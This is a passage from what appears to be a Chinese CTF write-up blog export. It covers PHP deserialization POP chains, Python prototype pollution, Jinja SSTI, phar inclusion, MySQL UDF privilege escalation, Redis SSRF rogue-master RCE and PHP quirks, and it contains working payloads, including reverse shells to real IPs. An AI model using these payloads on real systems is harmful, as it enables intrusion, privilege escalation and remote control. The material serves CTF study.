=&amp;$b;xdebug_debug_zval(&#x27;a&#x27;);unset($b,$c);xdebug_debug_zval(&#x27;a&#x27;);?&gt;\n\n引用$a的变量$b和$c都被unset了，所以这里的is_ref应该是false，也是因为unset，这里的refcount应该从3变成了1，接下来验证一下\n\nCG与反序列化的利用__destruct（析构函数）当某个对象成为垃圾或者当对象被显式销毁时执行销毁\n执行__destruct方法，就得绕过这个throw new Exception。因为__destruct方法是在该对象被回收时调用，而exception会中断该进程对该对象的销毁\n\na:2:{i:0;O:1:”B”:0:{}i:1;i:0;}\n改为\na:2:{i:0;O:1:”B”:0:{}i:0;i:0;}\n即可触发GC\n发现只要索引相同，即可绕过异常抛出\na:{i:1;O:1:”B”:0:{}i:1;i:0;}\n具体了解 双递减漏洞\n漏洞报告如下（CVE-2016-5771）： https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5771 。\nhttps://www.anquanke.com/post/id/149424\n知道这两者，即可攻破该题目\n利用PHP垃圾回收机制构造pop123456789101112131415161718192021222324&lt;?phpclass AAA&#123;    public $s;    public $a;&#125;class BBB&#123;    public $c;    public $d;&#125;class CCC&#123;    public $c;&#125;$c=new CCC();$a=new AAA();$b=new BBB;$a-&gt;s=$b;$c-&gt;c=$a;$d=array($c,1);echo serialize($d);\n\n输出\na:2:{i:0;O:3:”CCC”:1:{s:1:”c”;O:3:”AAA”:2:{s:1:”s”;O:3:”BBB”:2:{s:1:”c”;N;s:1:”d”;N;}s:1:”a”;N;}}i:1;i:1;}\n再改为\na:2:{i:0;O:3:”CCC”:1:{s:1:”c”;O:3:”AAA”:2:{s:1:”s”;O:3:”BBB”:2:{s:1:”c”;N;s:1:”d”;N;}s:1:”a”;N;}}i:0;i:1;}\n即可绕过\n动态函数执行语句\n\n可以发现在动态执行函数语句构造完成之后，再追加无关参数不影响命令执行\n\n\n12345&lt;?php$array = [&#x27;lastname&#x27;, &#x27;email&#x27;, &#x27;phone&#x27;];var_dump(implode(&quot;,&quot;, $array)); // string(20) &quot;lastname,email,phone&quot;\n\n便可以将这两个函数搭配使用 构造动态函数执行语句，如下是目标语句\n\n将目标语句放入pop中构造即可\npop及最终payload\n123456789101112131415161718192021222324&lt;?phpclass AAA&#123;    public $s;    public $a;&#125;class BBB&#123;    public $c=&#x27;cat /flag&#x27;;    public $d;&#125;class CCC&#123;    public $c;&#125;$c=new CCC();$a=new AAA();$b=new BBB;$a-&gt;s=$b;$c-&gt;c=$a;$d=array($c,0);echo serialize($d);\n\n\n私有属性进行序列化Really EZ POPpop链很好构造\nexp\n12345678910111213141516171819202122232425262728293031323334353637&lt;?phpclass Sink&#123;    private $cmd = &#x27;system(&quot;ls&quot;);&#x27;;&#125;class Shark&#123;    private $word;    public function setWord($word) //1 $Si    &#123;        $this-&gt;word = $word;    &#125;&#125;class Sea&#123;    public $animal; //2 $Sh&#125;class Nature&#123;    public $sea;  //3 $Se&#125;$Si=new Sink;$Sh=new Shark;$Se=new Sea;$N=new Nature;$Sh -&gt;setWord($Si);$Se -&gt;animal=$Sh;$N -&gt;sea=$Se;echo serialize($N);\n\nphp类中的私有属性考点，是低版本的php类中的私有属性进行序列化的方法\n123456789class Shark&#123;    private $word;    public function setWord($word) //1 $Si    &#123;        $this-&gt;word = $word;    &#125;&#125;\n\n在Shark中的私有属性word直接使用$Sh -&gt;word=$Si;会报错，需要自己构造一个方法，在这里是setword,构造链子时改为$Sh -&gt;setWord($Si);即可，其他方法不变\n序列化和rce第四届极客少年挑战赛初赛 ezunserilize1234567891011121314151617181920212223242526272829303132333435363738394041424344454647 &lt;?phpshow_source(__FILE__);//you should find flag in you selfclass one&#123;    public $a;    function new()&#123;        printf(&quot;i am new baby&quot;);    &#125;    public function __wakeup()    &#123;        $this-&gt;a-&gt;new();    &#125;&#125;class two&#123;    public $func;    public $arg;    public function __call($func,$arg)    &#123;        $this-&gt;func-&gt;arg;    &#125;&#125;class three&#123;    public $kkk;    public function __get($kkk)&#123;        return &quot;look!you are hero&quot;.$this-&gt;kkk;    &#125;&#125;class four &#123;    public $s;    public function eval()    &#123;        $pattern = &quot;/(ls|c|a|t| |f|i|n|d&#x27;)/&quot;;        if (preg_match($pattern, $this-&gt;s)) &#123;            print(&quot;oh nonono hacker!&quot;);            return &#x27;&#x27;;        &#125; else &#123;            return system($this-&gt;s);        &#125;    &#125;    public function __toString() &#123;        $this-&gt;eval();        return &#x27;aaaa&#x27;;    &#125;&#125;(unserialize(base64_decode($_GET[&#x27;cmd&#x27;]))); \n\n构造poc\n1234567891011121314151617181920212223242526272829&lt;?phpclass one&#123;    public $a; //3 $tw&#125;class two&#123;    public $func; // 2 $th    public $arg;&#125;class three&#123;    public $kkk; //1 $fo&#125;class four &#123;    public $s=&#x27;$&quot;\\154\\163&quot;&#x27;;&#125;$o =new one;$tw =new two;$th=new three;$fo = new four;$th-&gt;kkk=$fo;$tw-&gt; func=$th;$o-&gt;a=$tw;echo serialize($o);\n\n解法一：构造八进制命令首先想到的是构造八进制命令\n1234567891011121314151617181920def get_oct(c):    &quot;&quot;&quot;将字符转换为八进制表示&quot;&quot;&quot;    return format(ord(c), &#x27;03o&#x27;)  # 使用03o格式，确保每个字符的八进制表示为三位数def cmd_to_oct(cmd):    &quot;&quot;&quot;将命令字符串转换为八进制转义格式&quot;&quot;&quot;    payload = &quot;$&#x27;&quot;    for c in cmd:        if c == &#x27; &#x27;:            payload += &quot;&#x27; $&#x27; &quot;  # 在空格处插入转义表示        else:            payload += &quot;\\\\&quot; + get_oct(c)  # 添加字符的八进制转义表示    payload += &quot;&#x27;&quot;    return payload# 示例用法if __name__ == &quot;__main__&quot;:    command = input(&quot;请输入要转换的命令: &quot;)  # 从用户输入获取命令    oct_payload = cmd_to_oct(command)  # 转换命令    print(&quot;转换后的八进制表示:&quot;, oct_payload)  # 输出转换结果\n\n空格替换\\t但是ls &#x2F;存在空格直接拿burp抓包对其16进制修改\n\n将20改为09\n复制payload,进行base64加密\nls\t&#x2F;O:3:&quot;one&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;two&quot;:2:&#123;s:4:&quot;func&quot;;O:5:&quot;three&quot;:1:&#123;s:3:&quot;kkk&quot;;O:4:&quot;four&quot;:1:&#123;s:1:&quot;s&quot;;s:19:&quot;$&#39;\\154\\163&#39;\t$&#39;\\057&#39;&quot;;&#125;&#125;s:3:&quot;arg&quot;;N;&#125;&#125;\nTzozOiJvbmUiOjE6e3M6MToiYSI7TzozOiJ0d28iOjI6e3M6NDoiZnVuYyI7Tzo1OiJ0aHJlZSI6MTp7czozOiJra2siO086NDoiZm91ciI6MTp7czoxOiJzIjtzOjE5OiIkJ1wxNTRcMTYzJwkkJ1wwNTcnIjt9fXM6MzoiYXJnIjtOO319\n\ncat\t&#x2F;4l2gO:3:&quot;one&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;two&quot;:2:&#123;s:4:&quot;func&quot;;O:5:&quot;three&quot;:1:&#123;s:3:&quot;kkk&quot;;O:4:&quot;four&quot;:1:&#123;s:1:&quot;s&quot;;s:39:&quot;$&#39;\\143\\141\\164&#39;\t$&#39;\\057\\064\\154\\062\\147&#39;&quot;;&#125;&#125;s:3:&quot;arg&quot;;N;&#125;&#125;\nTzozOiJvbmUiOjE6e3M6MToiYSI7TzozOiJ0d28iOjI6e3M6NDoiZnVuYyI7Tzo1OiJ0aHJlZSI6MTp7czozOiJra2siO086NDoiZm91ciI6MTp7czoxOiJzIjtzOjM5OiIkJ1wxNDNcMTQxXDE2NCcJJCdcMDU3XDA2NFwxNTRcMDYyXDE0NyciO319czozOiJhcmciO047fX0&#x3D;\n\n\n解释为什么不用${IFS}\n\n牵扯到base64编码\n一些linux并不能识别${IFS}\n\n\n解法二：more绕过直接payload\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;?php//you should find flag in you selfclass one&#123;    public $a;    function new()&#123;        printf(&quot;i am new baby&quot;);    &#125;    public function __wakeup()    &#123;        $this-&gt;a-&gt;new();    &#125;&#125;class two&#123;    public $func;    public $arg;    public function __call($func,$arg)    &#123;        $this-&gt;func-&gt;arg;    &#125;&#125;class three&#123;    public $kkk;    public function __get($kkk)&#123;        return &quot;look!you are hero&quot;.$this-&gt;kkk;    &#125;&#125;class four &#123;    public $s;    public function eval()    &#123;        $pattern = &quot;/(ls|c|a|t| |f|i|n|d&#x27;)/&quot;;        if (preg_match($pattern, $this-&gt;s)) &#123;            print(&quot;oh nonono hacker!&quot;);            return &#x27;&#x27;;        &#125; else &#123;            return system($this-&gt;s);        &#125;    &#125;    public function __toString() &#123;        $this-&gt;eval();        return &#x27;aaaa&#x27;;    &#125;&#125;$obj_one = new one();$obj_two = new two();$obj_three = new three();$obj_four = new four();// Set up the chain$obj_four-&gt;s = &quot;more\t/*&quot;;$obj_three-&gt;kkk = $obj_four;$obj_two-&gt;func = $obj_three;$obj_one-&gt;a = $obj_two;$pop = serialize($obj_one);print(base64_encode($pop));//unserialize($pop);\n\n\n\n\n\n","slug":"赛题总结1","date":"2024-10-31T08:36:49.000Z","categories_index":"","tags_index":"赛题","author_index":"Sygsdsg"},{"id":"442c6fcbd30c196cf34836f1e603185c","title":"赛题总结2","content":"原型链污染python原型链污染Jinja Mark\npython原型链污染例子\n\n12345678910111213141516171819202122232425262728293031323334353637a = 1def merge(src, dst):    for k, v in src.items():        if hasattr(dst, &#x27;__getitem__&#x27;):            if dst.get(k) and type(v) == dict:                merge(v, dst.get(k))            else:                dst[k] = v        elif hasattr(dst, k) and type(v) == dict:            merge(v, getattr(dst, k))        else:            setattr(dst, k, v)def demo():    passclass A:    def __init__(self):        passclass B:    classa = 2instance = A()payload = &#123;    &quot;__init__&quot;: &#123;        &quot;__globals__&quot;: &#123;            &quot;a&quot;: 4,            &quot;B&quot;: &#123;                &quot;classa&quot;: 5            &#125;        &#125;    &#125;&#125;print(B.classa)  # 2print(a)         # 1merge(payload, instance)print(B.classa)  # 5print(a)         # 4\n\n参考文章https://xz.aliyun.com/t/13072#toc-13\n绕过黑名单进入到&#x2F;index 进行ssti注入发现有黑名单，查看提示发现是\n123456789101112131415161718192021BLACKLIST_IN_index = [&#x27;&#123;&#x27;,&#x27;&#125;&#x27;]def merge(src, dst):    for k, v in src.items():        if hasattr(dst, &#x27;__getitem__&#x27;):            if dst.get(k) and type(v) == dict:                merge(v, dst.get(k))            else:                dst[k] = v        elif hasattr(dst, k) and type(v) == dict:            merge(v, getattr(dst, k))        else:            setattr(dst, k, v)@app.route(&#x27;/magic&#x27;,methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])def pollute():    if request.method == &#x27;POST&#x27;:        if request.is_json:            merge(json.loads(request.data), instance)            return &quot;这个魔术还行吧&quot;        else:            return &quot;我要json的魔术&quot;    return &quot;记得用POST方法把魔术交上来&quot;\n\n需要将黑名单ban掉，将payload以json的格式通过POST传入 &#x2F;magic exp如下\n12345678910111213141516171819202122232425262728293031323334import requestsimport json# 构建要发送的 payloadpayload = &#123;    &quot;__class__&quot;: &#123;        &quot;__init__&quot;: &#123;            &quot;__globals__&quot;: &#123;                &quot;BLACKLIST_IN_index&quot;: []            &#125;        &#125;    &#125;&#125;# 将 payload 转换为 JSON 格式json_payload = json.dumps(payload)# 定义 URLurl = &quot;http://gz.imxbt.cn:20155/magic&quot;# 打印请求的键和值print(&quot;请求的 URL:&quot;, url)print(&quot;请求的头部信息:&quot;, &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;)print(&quot;请求的 Payload:&quot;, json_payload)try:    # 发送 POST 请求    response = requests.post(url, data=json_payload, headers=&#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;)    # 打印响应内容    print(&quot;状态码:&quot;, response.status_code)    print(&quot;响应内容:&quot;, response.text)except requests.exceptions.RequestException as e:    print(&quot;请求发生错误:&quot;, e)\n\n1234567payload = &#123;    &quot;__init__&quot;: &#123;        &quot;__globals__&quot;: &#123;            &quot;BLACKLIST_IN_index&quot;: []        &#125;    &#125;&#125;\n\n发送响应的json字符串\n\nSSTI注入再次进行ssti注入发现无黑名单\n最终payload:\n12&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()&#125;&#125; &#123;&#123;lipsum.__globals__.os.popen(&#x27;whoami&#x27;).read()&#125;&#125;\n\n特殊变量与原型链污染的关系圣钥之战1.0在&#x2F;read路由下看到\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from flask import Flask,requestimport jsonapp = Flask(__name__)def merge(src, dst):    for k, v in src.items():        if hasattr(dst, &#x27;__getitem__&#x27;):            if dst.get(k) and type(v) == dict:                merge(v, dst.get(k))            else:                dst[k] = v        elif hasattr(dst, k) and type(v) == dict:            merge(v, getattr(dst, k))        else:            setattr(dst, k, v)def is_json(data):    try:        json.loads(data)        return True    except ValueError:        return Falseclass cls():    def __init__(self):        passinstance = cls()@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def hello_world():    return open(&#x27;/static/index.html&#x27;, encoding=&quot;utf-8&quot;).read()@app.route(&#x27;/read&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def Read():    file = open(__file__, encoding=&quot;utf-8&quot;).read()    return f&quot;J1ngHong说：你想read flag吗？那么圣钥之光必将阻止你！但是小小的源码没事，因为你也读不到flag(乐)&#123;file&#125;&quot;@app.route(&#x27;/pollute&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def Pollution():    if request.is_json:        merge(json.loads(request.data),instance)    else:        return &quot;J1ngHong说：钥匙圣洁无暇，无人可以污染！&quot;    return &quot;J1ngHong说：圣钥暗淡了一点，你居然污染成功了？&quot;if __name__ == &#x27;__main__&#x27;:    app.run(host=&#x27;0.0.0.0&#x27;,port=80)\n\n看到&#x2F;read路由是通过__file__来读取文件，__file__的值可以通过merge来修改，直接构造payload\n123456789101112131415161718192021222324252627282930313233import requestsimport json# 构建要发送的 payloadpayload = &#123;    &quot;__init__&quot;: &#123;        &quot;__globals__&quot;: &#123;            &quot;__file__&quot;: &quot;flag&quot; #/proc/1/environ        &#125;    &#125;&#125;# 将 payload 转换为 JSON 格式json_payload = json.dumps(payload)# 定义 URLurl = &quot;http://gz.imxbt.cn:20199/pollute&quot;# 打印请求的键和值print(&quot;请求的 URL:&quot;, url)print(&quot;请求的头部信息:&quot;, &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;)print(&quot;请求的 Payload:&quot;, json_payload)try:    # 发送 POST 请求    response = requests.post(url, data=json_payload, headers=&#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;)    # 打印响应内容    print(&quot;状态码:&quot;, response.status_code)    print(&quot;响应内容:&quot;, response.text)except requests.exceptions.RequestException as e:    print(&quot;请求发生错误:&quot;, e)\n\n再次访问&#x2F;read即可\n/proc/1/environ 文件用于存放进程 ID 为 1 的进程（通常是 init 或 systemd）的环境变量。该文件包含了一系列以空字符 (\\0) 分隔的环境变量，这些变量在进程启动时被设置\n文件包含文件包含pharNISACTF 2022 bingdundun~例题\nhttps://www.nssctf.cn/problem/2026 \n将shell压缩成zip进行上传\n\n上传之后用phar伪协议来解压出该文件中的内容\n最终payload:\nGET:  ?bingdundun&#x3D;phar:&#x2F;&#x2F;494ff243b2fc65c01462174e09e95088.zip&#x2F;web\n连接蚁剑即可\nbabyuploadCVE-2020-35736利用 os.path.join 处理路径的拼接问题 https://www.nssctf.cn/problem/2025\n file_path = os.path.join(&quot;var&quot;, &quot;lib&quot;, filename)\n传入文件会自动拼接**&#x2F;var&#x2F;lib&#x2F;$filename** \n如果变量名前有**&#x2F;，os.path.join会忽略掉var&#x2F;lib** \neg:\n$filename&#x3D;&#x2F;flag \n读取路径为&#x2F;flag (直接读取根目录的flag isset)\nbabyserializepop 4对象 https://www.nssctf.cn/problem/1852\n提权直接fenjing一把梭2024年春秋杯网络安全联赛夏季赛 brother1&#123;&#123;cycler.next.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/156.238.233.41/8888 0&gt;&amp;1&#x27;&quot;).read()&#125;&#125;\n\n进行反弹shell到服务器上\nUDF提权12345cat /flag  #发现权限不够ss -tuln   #查看端口cat api.py #发现mysql用户和密码\n\n发现6666开启mysql服务\n可以尝试进行UDF提权\n服务器开启http服务\n将lib_mysqludf_sys_64.so文件传输到靶机上\n123456789101112131415mysql -uctf -p123456 -P 6666 -D mysql -e &quot;select @@version_compile_os, @@version_compile_machine;&quot;mysql -uctf -p123456 -P 6666 -D mysql -e &quot;show variables like &#x27;%plugin%&#x27;;&quot;mysql -uctf -p123456 -P 6666 -D mysql -e &quot;create table foo(line blob);&quot;mysql -uctf -p123456 -P 6666 -D mysql -e &quot;insert into foo values(load_file(&#x27;/tmp/lib_mysqludf_sys_64.so&#x27;));&quot;mysql -uctf -p123456 -P 6666 -D mysql -e &quot;select * from foo into dumpfile &#x27;/usr/lib/mysql/plugin/udf.so&#x27;;&quot;mysql -uctf -p123456 -P 6666 -D mysql -e &quot;CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.so&#x27;;&quot;mysql -uctf -p123456 -P 6666 -D mysql -e &quot;select * from mysql.func;&quot;mysql -uctf -p123456 -P 6666 -D mysql -e &quot;select sys_eval(&#x27;whoami&#x27;);&quot; #返回 root\n\n创建函数成功，进行反弹rootshell\n12mysql -uctf -p123456 -P 6666 -D mysql -e &quot;select sys_eval(&#x27;bash -c \\\\&#x27;bash -i &gt;&amp; /dev/tcp/156.238.233.41/9999 0&gt;&amp;1\\\\&#x27;&#x27;);&quot;  #  \\\\&#x27; 对单引号进行转义\n\n接受shell，cat &#x2F;flag\nSSRFSSRF之Redis主从复制实现RCESSRFMe 2020网鼎杯redis常用命令1234567891011121314151617set xz &quot;Hacker&quot;                     # 设置键xz的值为字符串Hackerget xz                              # 获取键xz的内容SET score 857                       # 设置键score的值为857INCR score                          # 使用INCR命令将score的值增加1GET score                           # 获取键score的内容keys *                              # 列出当前数据库中所有的键config set protected-mode no        # 关闭安全模式get anotherkey                      # 获取一个不存在的键的值config set dir /root/redis          # 设置保存目录config set dbfilename redis.rdb     # 设置保存文件名config get dir                      # 查看保存目录config get dbfilename               # 查看保存文件名save                                # 进行一次备份操作flushall                            # 删除所有数据del key                             # 删除键为key的数据slaveof ip port                     # 设置主从关系redis-cli -h ip -p 6379 -a passwd   # 外部连接\n\n主从复制是指将一台Redis主服务器的数据，复制到其他的Redis从服务器。前者称为主节点(master)，后者称为从节点(slave)；\n所有的数据修改只在主服务器上进行，然后将最新的数据同步给从服务器，这样就使得主从服务器的数据是一致的\n建立主从复制，有3种方式：\n配置文件写入 slaveof &lt;master_ip&gt; &lt;master_port&gt;\n\nredis-server启动命令后加入 --slaveof &lt;master_ip&gt; &lt;master_port&gt;\n\n连接到客户端之后执行 slaveof &lt;master_ip&gt; &lt;master_port&gt;\n\n\n  PS：建立主从关系只需要在从节点操作就行了，主节点不用任何操作\n使用exp进行rce预先通过内网穿透将端口（8009）映射到公网上\n使用 Redis 远程代码执行脚本开启服务\n使用说明\nhttps://blog.csdn.net/gitblog_09313/article/details/142229727\n1python3 redis_rogue_server.py -v -path exp.so -lport 8009\n\n\n\n进入到目标目录12345gopher://0.0.0.0:6379/_auth%2520root%250Aconfig%2520set%2520dir%2520%252Ftmp%252F%250Aquit_auth rootconfig set dir /tmp/ #tmp目录有相应权限quit\n\n从本地添加文件123456gopher://0.0.0.0:6379/_auth%2520root%250Aconfig%2520set%2520dbfilename%2520exp.so%250Aslaveof%2520121.43.126.238%25208009%2520%2520%250Aquit_auth rootconfig set dbfilename exp.soslaveof 121.43.126.238 8009  #公网ip， 开启主服务quit\n\n加载exp12345gopher://0.0.0.0:6379/_auth%2520root%250Amodule%2520load%2520.%252Fexp.so%250Aquit_auth rootmodule load ./exp.soquit\n\nrce12345gopher://0.0.0.0:6379/_auth%2520root%250Asystem.exec%2520%2522cat%2520%252Fflag%2522%250Aquit_auth rootsystem.exec &quot;cat /flag&quot;quit\n\n以上三个命令可以合并123456789gopher://0.0.0.0:6379/_auth%2520root%250Aconfig%2520set%2520dir%2520%252Ftmp%252F%250Aconfig%2520set%2520dbfilename%2520exp.so%250Aslaveof%2520121.43.126.238%25208009%250Amodule%2520load%2520.%252Fexp.so%250Asystem.exec%2520%2522cat%2520%252Fflag%2522%250Aquit_auth rootconfig set dir /tmp/config set dbfilename exp.soslaveof 121.43.126.238 8009module load ./exp.sosystem.exec &quot;cat /flag&quot;quit\n\n也可以进行反弹shell123456gopher://0.0.0.0:6379/_auth%2520root%250Asystem.rev%2520121.43.126.238%2520%25208888%250Aquit#上述payload的解码结果_auth rootsystem.rev 121.43.126.238  8888quit\n\n","slug":"赛题总结2","date":"2024-10-31T08:30:56.000Z","categories_index":"","tags_index":"赛题","author_index":"Sygsdsg"},{"id":"411ff314093c5c27d7d9daaaa1c43d8a","title":"sudo","content":"SUDOGTFOBins\n1sudo -l\n\nCVE-2019-14287aptapache2ashawkbase64bashcpcpulimitcurldatedd（Data Duplicator）dstatedenvexiftoolexpectfail2banfindflockftpgccgdbgitgzip&#x2F;gunziphping3iftopjavajjsjournalctlknifelessmanmoremountmysqlnanoneofetchnicenmapnodenohubopenvpnpasswdperlphppicopkexecpython3rvimscpscreenscriptsedservicesocatsshssh-keygenstracesystemctltcpdumpteetimedatectltmuxviwallwatchwgetzipxxd","slug":"sudo","date":"2024-10-30T11:01:49.000Z","categories_index":"","tags_index":"sudo提权","author_index":"Sygsdsg"},{"id":"cd1787040df7226f24b8f728e6089b8f","title":"php特性","content":"php特性1.intval \n也就是说传入是数组时，返回值为1 (弱比较)\n此函数会将 + 空格来进行跳过判断\n\n\n当base&#x3D;0时，进制可以自定义\nWeb92传入其他进制形式的4476即可\nWeb93Eg:八进制010574  16进制 0x117c\n因为返回值是整数 (也就是只检查整数)\n所以传入值为4476.1也行\n2.preg_match​    m—表示多行匹配，默认只匹配一行（第一行）\nweb91利用该特性绕过第一行的正则匹配\n​    payload:%a0php\n web131\n利用栈溢出 （长度绕过）\n\n请求即可\n3.strops\n​    检测指定字符第一次出现的位置，出现即阻断，返回false\n \n\n4.php三目运算符Web98 自行理解\n5.in_array​    搜索数组中是否有指定值\n​    in_array(a,b) 在b中寻找是否有a\n6.is_numeric​    用于检查一个变量是否是一个数字或者数字字符串\n$var1 &#x3D; 123;\n$var2 &#x3D; “456”;\n$var3 &#x3D; “abc”;\nvar_dump(is_numeric($var1)); &#x2F;&#x2F; 输出: bool(true)\nvar_dump(is_numeric($var2)); &#x2F;&#x2F; 输出: bool(true)\nvar_dump(is_numeric($var3)); &#x2F;&#x2F; 输出: bool(false)\n7. and与&amp;&amp;的区别 （优先级）+反射类ReflectionClass的使用Web100​    &amp;&amp; &gt; || &gt; &#x3D; &gt; and &gt; or\n​    逻辑运算符 **and** 优先级比 **=** 更低\n​    $v0&#x3D;is_numeric($v1) and is_numeric($v2) and is_numeric($v3);\n​    所以只要v1是数字 is_numeric()返回值为1  v0就为1\n​    V2直接闭合即可\n&lt;?php\n$a&#x3D;true and false and false;\nvar_dump($a); 返回true\n$a&#x3D;true &amp;&amp; false &amp;&amp; false;\nvar_dump($a); 返回false\n​    eval(&quot;$v2(&#39;ctfshow&#39;)$v3&quot;);\nl v2为执行的命令，v3要为分号与(‘ctfshow’)结合起来&#96;进行闭合\nl v2&#x3D;echo new ReflectionClass&amp;v3&#x3D;; \nReflectionClass它可以与已定义的类建立映射关系，通过反射类可以对类操作\nweb132&amp;&amp;的优先级高于||所以在\nif($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===&quot;admin&quot;)\n中，先运行&amp;&amp;再会运行||，\n当对于“与”（&amp;&amp;） 运算： x &amp;&amp; y 当x为false时，直接跳过，不执行y； \n对于“或”（||） 运算 ： x||y 当x为true时，直接跳过，不执行y\neg:\n&lt;?php   \n  $test=&quot;李四&quot;;   \n  $test==&quot;张三&quot;&amp;&amp;$test=&quot;张三来了&quot;;   \n  echo $test; //输出“李四”   \n  $test=&quot;李四&quot;;   \n  $test==&quot;张三&quot;||$test=&quot;张三不在这里&quot;;   \n  echo $test; //输出“张三不在这里”   \n?&gt;\n第一部分  $code &#x3D;&#x3D;&#x3D; mt_rand(1,0x36D) &amp;&amp; $password &#x3D;&#x3D;&#x3D; $flag  $code&#x3D;admin 返回（false）即可\n第二部分  $password &#x3D;&#x3D;&#x3D; $flag || $username &#x3D;&#x3D;&#x3D;”admin”             $password&#x3D;1  返回（false）即可\n最终payload:\nGET: ?code&#x3D;admin&amp;password&#x3D;1&amp;username&#x3D;admin\nhex2bin转换8.web102\n115044383959474e6864434171594473 该字符串16进制转字符串 利用hex2bin转换之后为 base64解密之后是 &lt;?&#x3D;cat  *;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource\n回显的是命令执行后的结果\nphp:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-decode&#x2F;resource\n回显的是文件内容base64编码后的格式\n9.ctype_alpha(mixed $text): bool string 类型的 text 里面的所有字符是否都是字母[A-Za-z]。\n如果在当前区域设置中 text 里的每个字符都是字母，那么就返回 true，否则返回 false。当使用空字符串调用时，结果始终为 false。\n10.变量覆盖web105$$key=$$value \n如果$key是”name”，那么**$$key就等于$name**\ndie($suces)\n输出 $suces 变量的值，然后终止脚本的执行。\npost中value不能等于flag\nget中key不能等于error\n思路一\n通过die($error);\nGET:suces&#x3D;flag\nPOST:error&#x3D;suces\n或者引入第三个变量\nGET:x&#x3D;flag\nPOST:error&#x3D;x\n思路二\n通过die($suces)\n?suces&#x3D;flag&amp;flag&#x3D;1\n11.parse_str将字符串解析成多个变量\n设置了第二个变量 result, 变量将会以数组元素的形式存入到这个数组\n123$str = &quot;first=value&quot;;parse_str($str, $output);echo $output[&#x27;first&#x27;];\n\nweb107123456$v1 = $_POST[&#x27;v1&#x27;];$v3 = $_GET[&#x27;v3&#x27;];parse_str($v1,$v2);if($v2[&#x27;flag&#x27;]==md5($v3))&#123;    echo $flag;&#125; \n\n此时v2是v1数组中的元素，同时v2也是一个数组\n$v2[‘flag’]就是v2数组中键值为flag的元素\n思路一\n传入特殊值进行绕过\nGET:v3&#x3D;240610708    md5加密之后为0e字符串 返回0\nPOST:v1&#x3D;flag&#x3D;0\n思路二\n让v1值为v3md5加密值即可\nGET:v3&#x3D;aa\nPOST:v1&#x3D;flag&#x3D;4124bc0a9335c27f086f24ba207a4912\n12.strrev+ereg strrev反转字符串\n1&lt;?phpecho strrev(&quot;Hello world!&quot;); // 输出 &quot;!dlrow olleH&quot;?&gt;\n\n1ereg (&quot;^[a-zA-Z]+$&quot;);\n\n正则表达式中^是开始位置，$是结束位置，+表示匹配前面的子表达式一次或多次\nereg函数存在%00截断漏洞\n思路\n传入字母之后用%00截断\n再传入倒叙数字\npayload:?c&#x3D;a%00778\n13.PHP异常处理 Exception经过实验发现如果类中存在**__toString**的魔术方法\n则给什么值就返回什么值\neg \n\n\n所以可以进行命令执行\n经查询之后发现Exception类可以实现（php内置类）\n![屏幕截图 2024-04-21 145659](php&#x2F;屏幕截图 2024-04-21 145659-17298377263546.png)\n12345678&lt;?php    try &#123;            throw new Exception(&quot;Some error message&quot;);    &#125; catch(Exception $e) &#123;        echo $e;&#125;?&gt;\n\n\n\n1234&lt;?php$reflectionClass = new ReflectionClass(&#x27;Exception&#x27;);echo $reflectionClass-&gt;__toString();?&gt;\n\n\n\nweb109payload:\nv1&#x3D;exception&amp;v2&#x3D;system(ls)\n上边提到的反射性也可以 用法完全相同\nv1&#x3D;Reflectionclass&amp;v2&#x3D;system(ls)\nPHP原生类总结https://xz.aliyun.com/t/13785?time__1311=GqmxuQi%3De7qeqGNDQi5BIKY5bRGKOOa4D#toc-0\n14.FilesystemIterator（php内置类）遍历文件\n\n12345678&lt;?php$info = new SplFileInfo(&#x27;foo&#x27;);var_dump($info-&gt;__toString());echo $info.PHP_EOL;$info = new SplFileInfo(&#x27;/usr/bin/php&#x27;);var_dump($info-&gt;__toString());echo $info.PHP_EOL;?&gt;\n\n12345以上示例的输出类似于：string(3) &quot;foo&quot;foostring(12) &quot;/usr/bin/php&quot;/usr/bin/php\n\n可以结合Obj来读取当前目录\n\n返回第一个文件名\n\n12345&lt;?php$dir = new DirectoryIterator(dirname(__FILE__));foreach ($dir as $fileinfo) &#123;echo $fileinfo;&#125;?&gt;\n\n遍历目录\nweb110payload:v1&#x3D;filesystemIterator&amp;v2&#x3D;getcwd\n15.GLOBAL全局变量\nweb111\n16.is_file\n\n如果文件存在且为正常的文件则返回 **true**，否则返回 **false**。  \n\n可见支持伪协议的的封装\n正常直接传入一个存在的文件会返回true\n用伪协议封装一个存在的文件会返回false \n\n\n17.compress.zlib:&#x2F;&#x2F;web113思路一\n发现过滤filter\n换取其他没有过滤的流即可\ncompress.zlib:&#x2F;&#x2F;\n思路二\n进行目录溢出 （长度绕过）\n&#x2F;proc&#x2F;self&#x2F;root代表根目录\n超过is_file能处理的最大长度就不认为是个文件\npayload:\nfile&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;p roc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;pro 